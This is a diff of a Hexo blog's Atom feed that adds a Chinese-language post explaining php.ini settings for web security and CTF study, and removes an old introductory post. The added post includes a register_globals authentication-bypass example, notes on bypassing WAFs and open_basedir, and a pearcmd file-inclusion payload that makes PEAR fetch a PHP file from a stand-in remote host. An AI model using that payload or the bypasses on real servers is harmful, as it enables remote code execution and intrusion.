@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2020-10-25T15:47:08.001Z</updated>
+  <updated>2020-10-26T03:36:31.508Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHP.INI</title>
+    <link href="http://example.com/2020/10/26/PHP-INI/"/>
+    <id>http://example.com/2020/10/26/PHP-INI/</id>
+    <published>2020-10-26T00:10:53.000Z</published>
+    <updated>2020-10-26T03:36:31.508Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="深入理解phpinfo"><a href="#深入理解phpinfo" class="headerlink" title="深入理解phpinfo()"></a>深入理解phpinfo()</h1><h2 id="一、php-ini核心配置说明"><a href="#一、php-ini核心配置说明" class="headerlink" title="一、php.ini核心配置说明"></a>一、php.ini核心配置说明</h2><p><strong>short_open_tag</strong>（是否开启PHP代码标志的缩写形式）</p><p>假如被开启了该配置，<code>&lt;? ?&gt;</code>也可以作为php语言开始的标志，可以用于绕过对于<code>&lt;?php</code>的检测。同时<code>&lt;?=</code> 和<code>&lt;? echo</code> 等价。和<code>asp_tags</code>的配置相同，但是后面这个是开启ASP的标志<code>&lt;%%&gt;</code>.但是在7.0.0版本之后就被搞出去了，可能是太好绕过WAF了。</p><p><strong>disable_functions</strong>(禁止内置函数)和<strong>disable_classes</strong>（ 禁止类）</p><p><strong>script_encoding</strong>（如果没有declare语句出现时，生效文件编码）</p><p><strong>variables_order</strong>（<code>E</code>nvironment, <code>G</code>et, <code>P</code>ost, <code>C</code>ookie, and <code>S</code>erver,是否开启这些特殊变量）</p><p><strong>request_order</strong>（指定GET，POST,COOKie进入php寄存器的顺序，从左到右，新值覆盖旧值）</p><p><strong>register_globals</strong>（自动注册PHP变量）<strong>本特性已自 PHP 5.3.0 起<em>废弃</em>并将自 PHP 5.4.0 起<em>移除</em>。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">register_globals &#x3D; on</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 当用户合法的时候，赋值 $authorized &#x3D; true</span><br><span class="line">if (authenticated_user()) &#123;</span><br><span class="line">    $authorized &#x3D; true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 由于并没有事先把 $authorized 初始化为 false，</span><br><span class="line">&#x2F;&#x2F; 当 register_globals 打开时，可能通过GET auth.php?authorized&#x3D;1 来定义该变量值</span><br><span class="line">&#x2F;&#x2F; 所以任何人都可以绕过身份验证</span><br><span class="line">if ($authorized) &#123;</span><br><span class="line">    include &quot;&#x2F;highly&#x2F;sensitive&#x2F;data.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">单纯地关闭 register_globals 并不代表所有的代码都安全了。对于每一段提交上来的数据，都要对其进行具体的检查。永远要验证用户数据和对变量进行初始化！</span><br></pre></td></tr></table></figure><p><strong>register_argc_argv</strong>（告诉php是否注册<code>argv &amp; argc variables</code> )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令行模式：https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;features.commandline.php</span><br><span class="line">这样可以通过CLI SAPI 将URL中的数据传递到命令行模式中执行</span><br><span class="line">?f&#x3D;pearcmd&amp;+install&amp;+http:&#x2F;&#x2F;a.com&#x2F;1.php</span><br><span class="line">f是文件包含，将执行这个pearcmd文件，然后输入到了命令行模式了，后面的参数也会传入到命令行中</span><br><span class="line">$argc包含当运行于命令行下时传递给当前脚本的参数的数目。</span><br><span class="line">$argv — 传递给脚本的参数数组</span><br></pre></td></tr></table></figure><p><strong>enable_post_data_reading</strong>（是否启用<a href="https://www.php.net/manual/zh/reserved.variables.post.php">$_POST</a> and <a href="https://www.php.net/manual/zh/reserved.variables.files.php">$_FILES</a>来进行读取数据）</p><p>如果设置为false，就会只能通过<code>php://input</code>来读取传递的数据。</p><p><strong>auto_prepend_file和auto_append_file</strong>（区别在于加载file的时间）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If the script is terminated with exit(), auto-append will not occur.</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc"><strong>magic_quotes_gpc</strong></a>（开启魔术方法，自动转义）</p><p><strong>include_path</strong>（很重要，但没必要讲）</p><p><strong>open_basedir</strong>（限制包含目录，但是可以绕过）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In httpd.conf, open_basedir can be turned off (e.g. for some virtual hosts) the same way as any other configuration directive with &quot;php_admin_value open_basedir none&quot;.</span><br></pre></td></tr></table></figure><p><strong>cgi.check_shebang_line</strong>（控制PHP是否检测#号开头的行）</p><p><code>cgi.discard_path</code> <a href="https://www.php.net/manual/zh/language.types.boolean.php">boolean</a></p><p>If this is enabled, the PHP CGI binary can safely be placed outside of the web tree and people will not be able to circumvent .htaccess security.</p><p><code>cgi.fix_pathinfo</code> <a href="https://www.php.net/manual/zh/language.types.boolean.php">boolean</a></p><p>Provides <em>real</em> <code>PATH_INFO</code>/ <code>PATH_TRANSLATED</code> support for CGI. PHP’s previous behaviour was to set <code>PATH_TRANSLATED</code> to <code>SCRIPT_FILENAME</code>, and to not grok what <code>PATH_INFO</code> is. For more information on <code>PATH_INFO</code>, see the CGI specs. Setting this to <code>1</code> will cause PHP CGI to fix its paths to conform to the spec. A setting of zero causes PHP to behave as before. It is turned on by default. You should fix your scripts to use <code>SCRIPT_FILENAME</code> rather than <code>PATH_TRANSLATED</code>.</p><p><strong>allow_url_include</strong>解决了远端引用(Include)</p><p><strong>allow_url_fopen</strong>去打开远端的文件</p><p>enable_dl = On （禁用dl()函数主要是出于安全考虑，因为它可以绕过open_basedir指令的限制。）</p><h2 id="二、参考链接"><a href="#二、参考链接" class="headerlink" title="二、参考链接"></a>二、参考链接</h2><p>php.ini详解：<a href="https://www.cnblogs.com/hugongs/articles/1060223.html">https://www.cnblogs.com/hugongs/articles/1060223.html</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;深入理解phpinfo&quot;&gt;&lt;a href=&quot;#深入理解phpinfo&quot; class=&quot;headerlink&quot; title=&quot;深入理解phpinfo()&quot;&gt;&lt;/a&gt;深入理解phpinfo()&lt;/h1&gt;&lt;h2 id=&quot;一、php-ini核心配置说明&quot;&gt;&lt;a href=</summary>
+      
+    
+    
+    
+    
+    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
   
   <entry>
     <title>Apache_conf</title>
@@ -486,30 +508,6 @@
     <category term="CTF" scheme="http://example.com/tags/CTF/"/>
     
     <category term="BUU" scheme="http://example.com/tags/BUU/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>This Is A New Beginning</title>
-    <link href="http://example.com/2020/09/13/new-begin/"/>
-    <id>http://example.com/2020/09/13/new-begin/</id>
-    <published>2020-09-13T02:22:57.000Z</published>
-    <updated>2020-09-13T02:59:39.450Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="This-Is-A-New-Beginning"><a href="#This-Is-A-New-Beginning" class="headerlink" title="This Is A New Beginning"></a>This Is A New Beginning</h1><h2 id="一、开场白"><a href="#一、开场白" class="headerlink" title="一、开场白"></a>一、开场白</h2><p>​        花了一个上午搭建而起的博客，gitpage+hexo 两个软件合成在一起，进行自己的学习的记录，记录python人工智能和CTF方向的学习知识，每天记录一点点，每天多学一点点，同时将自己的知识分享给大家，可以让大家一起少走一些弯路，如果有错的，不同的想法，请大家在评论区给出。后面将开通账号的注册功能，搭建一个论坛的系统。 <strong>for study</strong></p><h1 id="二、分享曾经经验"><a href="#二、分享曾经经验" class="headerlink" title="二、分享曾经经验"></a>二、分享曾经经验</h1><p><a href="https://www.yuque.com/crawler-splj2/ggs6sg">CTF-WEB</a></p><p><a href="https://www.yuque.com/crawler-splj2/ggs6sg">BUUCTF</a></p><p><a href="https://www.yuque.com/crawler-splj2/rgxure">MISC</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;This-Is-A-New-Beginning&quot;&gt;&lt;a href=&quot;#This-Is-A-New-Beginning&quot; class=&quot;headerlink&quot; title=&quot;This Is A New Beginning&quot;&gt;&lt;/a&gt;This Is A New Beg</summary>
-      
-    
-    
-    
-    <category term="随笔" scheme="http://example.com/categories/%E9%9A%8F%E7%AC%94/"/>
-    
-    
-    <category term="随笔" scheme="http://example.com/tags/%E9%9A%8F%E7%AC%94/"/>
     
   </entry>
   
